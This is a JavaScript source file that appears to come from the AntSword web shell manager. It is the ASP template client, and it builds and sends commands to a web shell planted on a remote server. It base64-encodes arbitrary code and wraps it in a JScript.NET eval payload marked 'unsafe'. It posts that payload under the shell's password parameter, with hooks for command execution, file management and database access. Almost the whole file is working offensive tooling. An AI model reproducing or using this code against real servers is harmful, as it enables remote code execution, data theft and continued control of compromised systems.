// 
// 代码模板::asp
// 

const iconv = global.require('iconv-lite');

class ASP {

  constructor(opts) {
    this.__opts__ = opts;
    this.parseTpl([
      'base',
      'command',
      'filemanager',
      'database/dsn',
      'database/mysql',
      'database/access',
      'database/oracle',
      'database/sqlserver',
      'database/sqloledb_1',
      'database/sqloledb_1_sspi',
      'database/microsoft_jet_oledb_4_0'
    ]);
    this.parseEnr([]);
  }

  // 格式化函数
  format() {
    const encode = this.__opts__['encode'] || 'utf8';
    return {
      base64: (str) => {
        // 编码
        const _str_ = iconv.encode(new Buffer(str), encode);
        return new Buffer(_str_).toString('base64');
      },
      // 转换为16进制::编码
      hex: (b) => {
        let ret = [];
        let buff = iconv.encode(new Buffer(b), encode);

        buff.toJSON()['data'].map((i) => {
          let _ = i.toString(16);
          _.length < 2 ? _ = `0${_}` : null;
          ret.push(_);
        });

        return ret.join('').toUpperCase();
      },
      // 转换为16进制::不编码
      buffer: (b) => {
        let ret = [];

        b.toJSON()['data'].map((i) => {
          let _ = i.toString(16);
          _.length < 2 ? _ = `0${_}` : null;
          ret.push(_);
        });

        return ret.join('').toUpperCase();
      }
    };
  }

  // 解析模板
  parseTpl(tpl) {
    let _export = {};

    // 模板格式化函数
    const format = this.format();

    // 加载模板代码
    tpl.map((t) => {
      // 解析模板
      this[t.replace(/\//g, '_')] = {};
      let m = require(`./template/${t}`);
      for (let _ in m) {
        this[t.replace(/\//g, '_')][_] = ( (c) => {
          // 如果需要参数
          if (typeof(c) === 'object') {
            return (argv, success, error, hook) => {
              let data = $.extend({}, c);
              // 格式化参数
              for (let d in data) {
                (data[d].match(/#{([\w\:]+)}/g) || []).map( (tag) => {
                  let _t = tag.substr(2, tag.length - 3);
                  // 如果需要字符处理
                  let _f = _t.split('::');
                  let _ff;
                  if ((_f.length > 0) && (_ff = format[_f[0]])) {
                    // _t = _ff(argv[_f[1]] || _t);
                    _t = _ff(argv[_f[1]] || '');
                  }else{
                    // _t = argv[_t] || _t;
                    _t = argv[_t] || '';
                  }
                  data[d] = data[d].replace(tag, _t)
                } );
              }
              this.ajax(data, success, error, hook);
            }
          }else{
            let data = {
              _: c
            };
            return (success, error, hook) => {
              this.ajax(data, success, error, hook);
            }
          }
        } )(m[_]);
      }
    });
  }

  // 解析编码模块
  parseEnr(edr) {
    let encoder = {
      // 默认编码器
      default: (pwd, data) => {
        data[pwd] = data['_'];
        delete data['_'];
        return data;
      }
    };
    edr.map((_) => {
      encoder[_] = require(`./encoder/${_}`);
    });
    this.__encoder__ = encoder;
  }

  ajax(code, success, error, hook) {
    let post = $.extend({}, code);
    // 随机ID(用于监听数据来源)
    const hash = (String(+new Date) + String(Math.random())).substr(10, 10).replace('.', '_');
    const tag_s = '-=:{';
    const tag_e = '}:=-';
    const encode = this.__opts__['encode'] || 'utf8';

    const code_base64 = this.format()['base64'](post['_']);

    post['_'] = `Response.Write("${tag_s}");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("${code_base64}")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.Write("${tag_e}");Response.End();`;

    // 编码处理模板
    const encoder = this.__encoder__[this.__opts__['encoder'] || 'default'] || this.__encoder__['default'];
    const data = encoder(this.__opts__['pwd'], post);

    // 监听数据返回
    antSword['ipcRenderer']
      // 请求完毕返回数据{text,buff}
      .on(`request-${hash}`, (event, arg) => {
        success(arg['text'], arg['buff']);
      })
      // HTTP请求返回字节流
      .on(`request-chunk-${hash}`, (event, ret) => {
        hook ? hook(ret) : null;
      })
      // 数据请求错误
      .on(`request-error-${hash}`, (event, ret) => {
        error ? error(ret) : null;
      })
      // 发送请求数据
      .send('request', {
        url: this.__opts__['url'],
        hash: hash,
        data: data,
        tag_s: tag_s,
        tag_e: tag_e,
        encode: encode
      });
  }

}

module.exports = ASP;